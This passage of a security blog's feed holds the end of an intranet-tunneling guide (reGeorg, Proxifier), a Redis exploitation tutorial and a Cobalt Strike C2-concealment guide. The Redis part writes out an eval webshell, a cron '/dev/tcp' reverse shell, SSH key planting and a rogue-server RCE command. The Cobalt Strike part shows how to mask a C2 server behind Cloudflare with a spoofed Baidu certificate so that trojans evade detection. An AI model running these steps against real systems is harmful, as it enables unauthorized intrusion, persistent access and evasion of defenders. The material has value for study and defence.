alt="3jdl"></p><p>B作为服务端口，D作为客户端</p><p>D建立一个Socks隧道到B的989端口</p><p>A作为服务端，B作为客户端</p><p>B将989端口映射到A的999端口</p><p>VPS作为服务端口，A作为客户端</p><p>A将999端口映射到B的10000端口</p><p>然后设置代理为VPS的10000端口，即可访问到C的web服务了</p><h2 id="2-4、regeorg"><a href="#2-4、regeorg" class="headerlink" title="2.4、regeorg"></a>2.4、regeorg</h2><h3 id="2-4-1、介绍"><a href="#2-4-1、介绍" class="headerlink" title="2.4.1、介绍"></a>2.4.1、介绍</h3><p>​        当目标只有一个端口能访问内网，其他端口不出网的情况下使用。通过上传脚本文件到web服务器，通过python2设置代理为该脚本地址来进行内网探测。</p><h3 id="2-4-2、参数介绍"><a href="#2-4-2、参数介绍" class="headerlink" title="2.4.2、参数介绍"></a>2.4.2、参数介绍</h3><pre class="line-numbers language-none"><code class="language-none">-p  代理监听端口-u  脚本地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-4-3、实际使用"><a href="#2-4-3、实际使用" class="headerlink" title="2.4.3、实际使用"></a>2.4.3、实际使用</h3><p>首先，上传隧道脚本文件(aspx|ashx|jsp|php) 到web服务器</p><p>本地运行</p><pre class="line-numbers language-none"><code class="language-none">python2 reGeorgSocksProxy.py -p 8888 -u http://目标:8080/tunnel/tunnel.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们设置socks代理为127.0.0.1:8888就可以进入内网了</p><h2 id="2-5、Proxifier"><a href="#2-5、Proxifier" class="headerlink" title="2.5、Proxifier"></a>2.5、Proxifier</h2><h3 id="2-5-1、介绍"><a href="#2-5-1、介绍" class="headerlink" title="2.5.1、介绍"></a>2.5.1、介绍</h3><p>​        Proxifier是一款功能非常强大的socks5客户端，可以让不支持代理服务器工作的程序变的可行。支持各种操作系统和各代理协议，它的运行模式可以指定端口，指定程序的特点。在内网穿透过程中常用来进行socks代理。</p><h3 id="2-5-2、实际使用"><a href="#2-5-2、实际使用" class="headerlink" title="2.5.2、实际使用"></a>2.5.2、实际使用</h3><p>添加代理服务器</p><p> <img src="https://img.ex1t.xyz//pro1.png" alt="pro1"></p><p>设置好ip、端口、[账号、密码]</p><p> <img src="https://img.ex1t.xyz//pro2.png" alt="pro2"></p><p>添加好代理服务器后，设置代理规则</p><p> <img src="https://img.ex1t.xyz//pro3.png" alt="pro3"></p><p>规则的优先级是从上到下</p><p> <img src="https://img.ex1t.xyz//pro4.png" alt="pro4"></p><p>新加了一个规则，远程桌面连接的程序（mstsc.exe），走我设置的代理服务器。</p><p>这样我们进行远程连接的时候就能看到具体连接与结果，因为我没有建立搭隧道，所以是连接失败的。</p><p>通过之前的工具建立隧道后，设置代理服务器为VPS:port，即可畅游内网</p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>​        本文主要介绍了内网穿透中所需要的工具与使用方法，写的有些仓促，如存在什么不足或补充，请邮件联系我。谢谢！</p><p>​</p>]]></content>
      
      
      
        <tags>
            
            <tag> frp </tag>
            
            <tag> ew </tag>
            
            <tag> reGeorg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis漏洞总结</title>
      <link href="/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p>Redis是一个开源的高性能键值数据库。最热门的NoSq数据库之一，也被人们称为数据结构服务器。</p><p>默认端口：6379</p><p>可能存在的漏洞：未授权访问、主从复制</p><h2 id="二、Redis相关漏洞利用"><a href="#二、Redis相关漏洞利用" class="headerlink" title="二、Redis相关漏洞利用"></a>二、Redis相关漏洞利用</h2><h3 id="2-1、未授权访问"><a href="#2-1、未授权访问" class="headerlink" title="2.1、未授权访问"></a>2.1、未授权访问</h3><h4 id="2-1-1、存在原因"><a href="#2-1-1、存在原因" class="headerlink" title="2.1.1、存在原因"></a>2.1.1、存在原因</h4><p>未设置密码或者设置弱密码</p><pre class="line-numbers language-none"><code class="language-none">bind 127.0.0.1      被注释了，所有机器都可以访问protected-mode no  关闭安全模式使用root权限 等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（被攻击机器）靶机安装好一个redis后，修改redis.conf后以root权限启动。</p><h4 id="2-1-2、常用命令"><a href="#2-1-2、常用命令" class="headerlink" title="2.1.2、常用命令"></a>2.1.2、常用命令</h4><ol><li>查看信息：<code>info</code> </li><li>删除所有数据库內容：<code>flushable</code> </li><li>刷新数据库：<code>flush</code> </li><li>看所有键：<code>KEYS*</code>，使用 <code>select nun</code>可以查看键值数据。 </li><li>设置变量：<code>set test“who am i</code> </li><li><code>config set dir dirpath</code>设置路径等配置</li><li><code>config get dir/filename</code>获取路径及数据配置信息 </li><li><code>save</code>保存 </li><li><code>get</code>变量，查看变量名称 </li><li>删除Key：<code>DEL KEY_NAME</code></li></ol><h4 id="2-1-3、利用方法"><a href="#2-1-3、利用方法" class="headerlink" title="2.1.3、利用方法"></a>2.1.3、利用方法</h4><p>（1）获取数据库信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli -h  <span class="token number">192.168</span>.31.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可成功进入到目标（192.168.31.152）redisl</p><p>查看redis版本相关信息，也判断是否存在密码</p><pre class="line-numbers language-none"><code class="language-none">info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功显示信息代表没有密码</p><p> <img src="https://img.ex1t.xyz//1.png" alt="1"></p><p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CONFIG GET <span class="token function">dir</span>         <span class="token comment">#设置目录</span>CONFIG GET dbfilename  <span class="token comment">#设置文件名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//2.png" alt="2"></p><p>（2）写webshell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/            <span class="token comment">#切换目录到网站的根目录（根据实际情况来） </span><span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php phpinfo();?&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>   <span class="token comment">#写入恶意代码phpinfo() </span><span class="token builtin class-name">set</span> xx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php @eval(<span class="token variable">$_POST</span>['-7']);?&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>  <span class="token comment">#写入一句话木马 </span>config <span class="token builtin class-name">set</span> dbfilename shell.php                    <span class="token comment">#生成木马文件shell.php </span>save                                               <span class="token comment">#进行保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//3.png" alt="3"></p><p>成功写入到目标机</p><p> <img src="https://img.ex1t.xyz//4.png" alt="4"></p><p>（3）写定时任务反弹shell</p><p>先在自己的服务器上监听一个端口 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvnp <span class="token number">9999</span>        <span class="token comment">#攻击机监听自己的7999端口 </span>redis-cli -h <span class="token number">192.168</span>.31.152 <span class="token comment">#进入对方redis </span><span class="token builtin class-name">set</span>  xx   <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.31.116/7999 0&gt;&amp;1<span class="token entity" title="\n">\n</span>"</span> <span class="token comment">#设置变量值为反弹shell语句 </span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/   <span class="token comment">#设置目录为目标机定时任务目录 </span>config <span class="token builtin class-name">set</span> dbfilename root        <span class="token comment">#设置文件名 </span>save                              <span class="token comment">#保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//5.png" alt="5"></p><p>写入成功</p><p> <img src="https://img.ex1t.xyz//6.png" alt="6"></p><p>但是一直nc没有接收到</p><p>查了下是因为存在乱码，centos会忽略乱码去执行格式正确的任务计划<br>而ubuntu并不会忽略这些乱码，所以导致命令执行失败<br>推荐可以亲自验证一下</p><p>（4）写入Linux ssh-key公钥，然后通过私钥直接登录。</p><p>攻击机：192.168.31.116</p><p>生成密钥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//7.png" alt="7"></p><p>将公钥内容导出到文本中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.ex1t.xyz//8.png" alt="8"></p><p>写入目标机器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> key.txt <span class="token operator">|</span> redis-cli -h <span class="token number">192.168</span>.31.152 -x <span class="token builtin class-name">set</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//9.png" alt="9"></p><p><img src="https://img.ex1t.xyz//10.png" alt="10"></p><p>设置路径、文件名保存，路径根据实际情况来改动</p><p> <img src="https://img.ex1t.xyz//11.png" alt="11"></p><p>写入成功</p><p><img src="https://img.ex1t.xyz//12.png" alt="12"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa <span class="token number">192.168</span>.31.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功</p><p><img src="https://img.ex1t.xyz//13.png" alt="13"></p><h3 id="2-2、主从复制"><a href="#2-2、主从复制" class="headerlink" title="2.2、主从复制"></a>2.2、主从复制</h3><h4 id="2-2-1、漏洞版本"><a href="#2-2-1、漏洞版本" class="headerlink" title="2.2.1、漏洞版本"></a>2.2.1、漏洞版本</h4><p>主从复制存在漏洞的版本</p><p><code>Redis &lt;= 5.0.5</code></p><h4 id="2-2-2、环境部署"><a href="#2-2-2、环境部署" class="headerlink" title="2.2.2、环境部署"></a>2.2.2、环境部署</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker pull damonevking/redis5.0  docker run -p <span class="token number">6379</span>:6379 -d damonevking/redis5.0 redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//14.png" alt="14"></p><h4 id="2-2-3、攻击原理"><a href="#2-2-3、攻击原理" class="headerlink" title="2.2.3、攻击原理"></a>2.2.3、攻击原理</h4><p>Redis是一个使用ANSIC编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。</p><p>但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。</p><h4 id="2-2-4、利用方式"><a href="#2-2-4、利用方式" class="headerlink" title="2.2.4、利用方式"></a>2.2.4、利用方式</h4><p>利用脚本</p><p><code>https://github.com/n0b0dyCN/redis-rogue-server</code></p><p>运行后可直接进行命令执行</p><pre class="line-numbers language-none"><code class="language-none">python3 redis-rogue-server.py --rhost 192.168.31.152 --lhost 192.168.31.146 --exp=exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://img.ex1t.xyz//15.png" alt="15"></p><p>脚本相关，看github上的脚本介绍即可。</p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>​    周末写的有些仓促，如果文章中存在什么问题，敬请指正。<br>​    以上仅供学习交流，严禁用于违法途径（手动狗头）。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike 主机隐藏教程</title>
      <link href="/2021/03/03/%E4%B8%BB%E6%9C%BA%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B/"/>
      <url>/2021/03/03/%E4%B8%BB%E6%9C%BA%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike-主机隐藏"><a href="#Cobalt-Strike-主机隐藏" class="headerlink" title="Cobalt Strike 主机隐藏"></a>Cobalt Strike 主机隐藏</h1><blockquote><p> 根据现有检测机制，来对服务器进行隐藏，减少c2服务器被检测到的几率。文章最初发表在freebuf  <a href="https://www.freebuf.com/articles/network/262445.html">https://www.freebuf.com/articles/network/262445.html</a></p></blockquote><p>CDN：cloudflare<br>服务器：阿里云香港 debian10 amd64<br>证书：let’s encrypt 免费证书<br>域名：dot.tk免费域名<br>CS：CobaltStrike 4.2</p><hr><h2 id="1、-CS服务端配置"><a href="#1、-CS服务端配置" class="headerlink" title="1、 CS服务端配置"></a>1、 CS服务端配置</h2><p>上传CS到服务器，配置java坏境等步骤略。<br>需要做的操作分别为：禁ping、修改默认端口、修改客户端连接证书。</p><h3 id="1-1-服务器禁ping"><a href="#1-1-服务器禁ping" class="headerlink" title="1.1 服务器禁ping"></a>1.1 服务器禁ping</h3><p>当服务器禁ping后，从某种角度可以判定为主机为不存活状态。</p><h4 id="1-1-1-修改系统配置。"><a href="#1-1-1-修改系统配置。" class="headerlink" title="1.1.1 修改系统配置。"></a>1.1.1 修改系统配置。</h4><p>编辑文件/etc/sysctl.conf，在里面增加一行。<br>    <code>net.ipv4.icmp_echo_ignore_all=1</code><br>之后使命命令<code>sysctl -p</code>使配置生效<br><img src="http://img.ex1t.xyz/mweb/16109390202253.jpg" alt="-w504"><br>之后在ping就无法ping通了。<br>这种方式nmap还是可以扫描到服务器的存活的。</p><h4 id="1-1-2-云服务器防火墙（安全组）"><a href="#1-1-2-云服务器防火墙（安全组）" class="headerlink" title="1.1.2 云服务器防火墙（安全组）"></a>1.1.2 云服务器防火墙（安全组）</h4><p>使用云服务器防火墙的方式可以更好的控制流量不流向云服务器本身。从外层入口阻断流量。<br>前提是需要你的服务器为ecs服务器，不能我这种轻量级主机。具体的操作这里就不记录操作了。毕竟我也没有这样还样的服务器。</p><h3 id="1-2-修改端口"><a href="#1-2-修改端口" class="headerlink" title="1.2 修改端口"></a>1.2 修改端口</h3><p>编辑teamserver文件，搜索50050，将其改为任意端口即可，这里改成53389。<br><img src="http://img.ex1t.xyz/mweb/16109347913120.jpg" alt="-w684"><br>保存退出再次启动时端口就变化了。<img src="http://img.ex1t.xyz/mweb/16109349336303.jpg" alt="-w391"></p><hr><h3 id="1-3-修改默认证书"><a href="#1-3-修改默认证书" class="headerlink" title="1.3 修改默认证书"></a>1.3 修改默认证书</h3><p>因为cs服务端生成的证书含有cs的相关特征所有，这里进行修改替换。修改方式有两种，分别为生成密钥库和修改启动文件。无论是那种方式都需要删去原有的文件cobaltstrike.store</p><h4 id="1-3-1-方法一生成证书"><a href="#1-3-1-方法一生成证书" class="headerlink" title="1.3.1 方法一生成证书"></a>1.3.1 方法一生成证书</h4><ol><li>删除密钥库文件cobaltstrike.store</li><li>使用命令<code>keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu -dname "CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd, L=beijing, S=beijing, C=CN"</code>可以生成新的密钥库文件</li><li>使用命令<code>keytool -list -keystore cobaltstrike.store </code>查看证书<img src="http://img.ex1t.xyz/mweb/16109367247422.jpg" alt="-w681"></li><li>启动服务器查看证书签名是否相同。<img src="http://img.ex1t.xyz/mweb/16109367827463.jpg" alt="-w695"></li></ol><h4 id="1-3-2-方法二修改文件"><a href="#1-3-2-方法二修改文件" class="headerlink" title="1.3.2 方法二修改文件"></a>1.3.2 方法二修改文件</h4><p>teamserver 是启动cs服务端的启动文件。里面有环境检测的部分，其中就包括密钥库的检测，这部分的写法是，如检测不到密钥库就使用命令生成新的密钥库，修改这里生成命令。<img src="http://img.ex1t.xyz/mweb/16109370660983.jpg" alt="-w690"></p><p>将其改为<code>keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname "CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd, L=Beijing, S=Beijing, C=CN"</code><br>删除原有的./cobaltstrike.store密钥库文件，下次启动时会自动生成新的密钥库文件。<br>这个密钥库也可以使用下面通过cloudflare申请的密钥库代理。</p><h2 id="2、使用CDN隐藏"><a href="#2、使用CDN隐藏" class="headerlink" title="2、使用CDN隐藏"></a>2、使用CDN隐藏</h2><p>cs生成的木马中会带有服务器的部分信息如IP、域名，使用cdn就可以很好的隐藏住这部分信息，并且在一定程度上可以规避杀毒软件的主机特征查杀。并且在其他大佬的文章中看到https的监听方式中不会采用cobaltstrike.store的密钥库。所以这里申请一个证书代替https监听方式中的默认证书。</p><h3 id="2-1-申请免费域名"><a href="#2-1-申请免费域名" class="headerlink" title="2.1 申请免费域名"></a>2.1 申请免费域名</h3><p>使用免费域名的好处是不会有过多的信息记录下来。<br>访问<a href="https://www.freenom.com/zh/index.html%E6%B3%A8%E5%86%8C%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%85%8D%E8%B4%B9%E4%BD%BF%E7%94%A8%E4%B8%80%E5%B9%B4%E3%80%82%E5%85%B7%E4%BD%93%E6%B3%A8%E5%86%8C%E7%96%91%E9%97%AE%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%E7%9F%A5%E4%B9%8E%E6%96%87%E7%AB%A0">https://www.freenom.com/zh/index.html注册，可以免费使用一年。具体注册疑问可以参考知乎文章</a> <a href="https://zhuanlan.zhihu.com/p/115535965">https://zhuanlan.zhihu.com/p/115535965</a><br><img src="http://img.ex1t.xyz/mweb/16106121048138.jpg" alt="-w831"></p><p>选择时长，免费12个月<br><img src="http://img.ex1t.xyz/mweb/16106128775105.jpg" alt="-w1276"><br>注册成功<br><img src="http://img.ex1t.xyz/mweb/16106129076708.jpg" alt="-w705"></p><p>这里我们用域名dotdotdotdot.tk做演示，演示结束后一段时间后删除域名。</p><h3 id="2-2-CDN配置"><a href="#2-2-CDN配置" class="headerlink" title="2.2 CDN配置"></a>2.2 CDN配置</h3><p>cdn部分可以选择其实挺多的，这里选择的是cloudflare。<br>1、注册账号<br>2、添加站点、选择免费计划、之后会扫描dns记录<br><img src="http://img.ex1t.xyz/mweb/16106133694928.jpg" alt="-w1129"><br><img src="http://img.ex1t.xyz/mweb/16106134063677.jpg" alt="-w986"><br>3、修改dotdotdotdot.tk的dns服务器为cloudflare。修改完成后需要一定的时间生效<br><img src="http://img.ex1t.xyz/mweb/16106134518009.jpg" alt="-w920"><br><img src="http://img.ex1t.xyz/mweb/16106134939519.jpg" alt="-w754"><br><img src="http://img.ex1t.xyz/mweb/16106135325993.jpg" alt="-w801"><br>4、关闭自动https重写和始终使用https、broti压缩<br>5、出现如下界面就设置生效，可以使用cloudflare进行域名解析操作了。<br><img src="http://img.ex1t.xyz/mweb/16106137836177.jpg" alt="-w787"><br>6、解析一个baidu.dotdotdotdot.tk测试一下。<br><img src="http://img.ex1t.xyz/mweb/16106139605510.jpg" alt="-w1083"><br><img src="http://img.ex1t.xyz/mweb/16106139777840.jpg" alt="-w568"><br>7、解析域名到你的vps上，配置如下。代理状态为已代理，这样所有的流量会流经cdn。<br><img src="http://img.ex1t.xyz/mweb/16109402367733.jpg" alt="-w806"></p><p><code>ping baidubaidu.dotdotdotdot.tk</code> 此时CDN已经生效<br><img src="http://img.ex1t.xyz/mweb/16109402057755.jpg" alt="-w550"><br>8、配置SSL/TLS加密模式为完全<br><img src="http://img.ex1t.xyz/mweb/16112001394146.jpg" alt="-w1200"></p><h3 id="2-3-cloudflare生成证书"><a href="#2-3-cloudflare生成证书" class="headerlink" title="2.3 cloudflare生成证书"></a>2.3 cloudflare生成证书</h3><p>在cloudflare的dash页面找到SSL/TLS-&gt;源服务器-&gt;创建证书，之后将公钥和私钥保存下来，分别为server.pem和server.key。一定要在生成的时候保存，不然可能找不到私钥了。</p><h4 id="2-3-1-申请证书并打包密钥库"><a href="#2-3-1-申请证书并打包密钥库" class="headerlink" title="2.3.1 申请证书并打包密钥库"></a>2.3.1 申请证书并打包密钥库</h4><p>将证书打包并生成store文件<br><code>openssl pkcs12 -export -in server.pem -inkey server.key -out baidubaidu.dotdotdotdot.tk.p12 -name baidubaidu.dotdotdotdot.tk -passout pass:123456</code><br><code>keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore baidubaidu.dotdotdotdot.tk.store -srckeystore baidubaidu.dotdotdotdot.tk.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias baidubaidu.dotdotdotdot.tk</code></p><h3 id="2-4-配置证书到https的监听方式中。"><a href="#2-4-配置证书到https的监听方式中。" class="headerlink" title="2.4 配置证书到https的监听方式中。"></a>2.4 配置证书到https的监听方式中。</h3><p>要想使用我们自己申请的证书，这里就需要使用‘Malleable C2 profile’的方式来操作。这里以cloudflare.profile为例。将生成的密钥文件.store放到cs目录下，想cloudflare.profile加入证书配置：<br>其中需要注意的是https-certificate为证书相关的配置，其他client.header中Host的值要为我们申请的域名，其他的部分，根据个人情况去配置。</p><pre class="line-numbers language-none"><code class="language-none">https-certificate {    set keystore "baidubaidu.dotdotdotdot.tk.store";    set password "123456";}http-stager {    set uri_x86 "/api/1";    set uri_x64 "/api/2";    client {        header "Host" "baidubaidu.dotdotdotdot.tk";}    server {        output{        print;        }    }        }http-get {    set uri "/api/3";    client {        header "Host" "baidubaidu.dotdotdotdot.tk";        metadata {            base64;            header "Cookie";        }        }    server {        output{        print;        }    }        }http-post {    set uri "/api/4";    client {        header "Host" "baidubaidu.dotdotdotdot.tk";        id {            uri-append;        }        output{        print;        }    }    server {        output{        print;        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用命令”./c2lint cloudflare.profile”去验证配置文件是否有问题。如下为验证成功的配置。<br><img src="http://img.ex1t.xyz/mweb/16109502195826.jpg" alt="-w687"><br>验证配置失败，会爆出如下错误，根据报错结果去修改你的配置文件。配置文件参考官方<a href="https://www.cobaltstrike.com/help-malleable-c2">帮助文件</a><br><img src="http://img.ex1t.xyz/mweb/16109503273723.jpg" alt="-w484"><br>使用配置文件启动服务器<br><code>./teamserver 172.17.21.142  123456 cloudflare.profile</code><br><img src="http://img.ex1t.xyz/mweb/16109504528136.jpg" alt="-w501"></p><h3 id="2-5-配置文件生成仓库"><a href="#2-5-配置文件生成仓库" class="headerlink" title="2.5 配置文件生成仓库"></a>2.5 配置文件生成仓库</h3><p>github上有一个仓库，可以用于生成c2配置文件，如果使用此种方式需要在木马生成部分的备注，不然可能会导致木马无法上线。<br>使用方式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装命令</span><span class="token function">git</span> clone https://github.com/FortyNorthSecurity/C2concealer <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> C2concealer <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x install.sh <span class="token operator">&amp;&amp;</span> ./install.sh<span class="token comment">#使用命令</span>C2concealer --variant <span class="token number">1</span> --hostname <span class="token string">"baidubaidu.dotdotdotdot.tk"</span><span class="token comment">#域名记得加引号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>baidu.store就是baidubaidu.dotdotdotdot.tk.store为了方便就改了文件名。<br><img src="http://img.ex1t.xyz/mweb/16111124525618.jpg" alt="-w882"><br>之后使用生成后的profile文件启动服务器即可</p><h3 id="2-6-生成木马配置"><a href="#2-6-生成木马配置" class="headerlink" title="2.6 生成木马配置"></a>2.6 生成木马配置</h3><p>作了如上的配置，在生成木马时需要做一些不一样的操作。<br><strong>注意：</strong> 免费版本的cloudflare支持解析少量的端口，具体端口如下<br><strong>http:</strong><br>    80、8080、8880、2052、2082、2086、2095<br><strong>https:</strong><br>    443、2053、2083、2087、2096、8443<br><img src="http://img.ex1t.xyz/mweb/16111125070170.jpg" alt="-w491"><br>之后生成木马，运行即可上线<br><img src="http://img.ex1t.xyz/mweb/16111125789335.jpg" alt="-w390"></p><p><img src="http://img.ex1t.xyz/mweb/16111125618380.jpg" alt="-w778"></p><p>powershell的上线方式与以前有些许不同。需要启动ssl证书。<br><img src="http://img.ex1t.xyz/mweb/16111126535204.jpg" alt="-w406"></p><p>备注：如果使用C2concealer生成profile，需要配置listener时在profile中选择variant_1才行，不然可能会导致无法上线。<br><img src="http://img.ex1t.xyz/mweb/16112097666001.jpg" alt="-w468"></p><h2 id="3、写在最后"><a href="#3、写在最后" class="headerlink" title="3、写在最后"></a>3、写在最后</h2><p>1、服务器防火墙，c2上线端口只能让cdn的IP访问，这样可以避免被扫描器扫描到，将你的IP加入威胁情报中去。具体配置可以在云服务器安全组操作。或者在服务器使用iptables操作。<br>2、证书申请这部分我走了很多的弯路，之前打算使用let’s Encrypt后来发现无论怎么操作都无法上线，<br>3、实际上这些操作都是服务器本身的隐藏，要想更好的使用CobaltStrike可能还需要做免杀，做木马文件签名等操作。<br>4、这些配置做完后，及时服务器不在继续使用，也可以将文件打包拷贝到新服务器中，后面只需更新DNS解析即可。</p><h3 id="cloudflare-使用的IP段"><a href="#cloudflare-使用的IP段" class="headerlink" title="cloudflare 使用的IP段"></a>cloudflare 使用的IP段</h3><p>全部IP段</p><pre class="line-numbers language-none"><code class="language-none">173.245.48.0/20103.21.244.0/22103.22.200.0/22103.31.4.0/22141.101.64.0/18108.162.192.0/18190.93.240.0/20188.114.96.0/20197.234.240.0/22198.41.128.0/17162.158.0.0/15104.16.0.0/12172.64.0.0/13131.0.72.0/22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>国内IP段是cloudflare与百度云合作的节点</p><pre class="line-numbers language-none"><code class="language-none">162.159.211.4-103103.21.244.0/22103.22.200.0/22103.31.4.0/22104.16.0.0/12108.162.192.0/18131.0.72.0/22141.101.64.0/18162.158.0.0/15172.64.0.0/13173.245.48.0/20188.114.96.0/20190.93.240.0/20197.234.240.0/22198.41.128.0/17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/god_zzZ/article/details/109057803">https://blog.csdn.net/god_zzZ/article/details/109057803</a></li><li><a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/">https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</a></li><li><a href="https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy">https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ELK搭建密码统计库</title>
      <link href="/2021/01/25/%E4%BD%BF%E7%94%A8elk%E6%90%AD%E5%BB%BA%E5%AF%86%E7%A0%81%E7%BB%9F%E8%AE%A1%E5%BA%93/"/>
      <url>/2021/01/25/%E4%BD%BF%E7%94%A8elk%E6%90%AD%E5%BB%BA%E5%AF%86%E7%A0%81%E7%BB%9F%E8%AE%A1%E5%BA%93/</url>
      
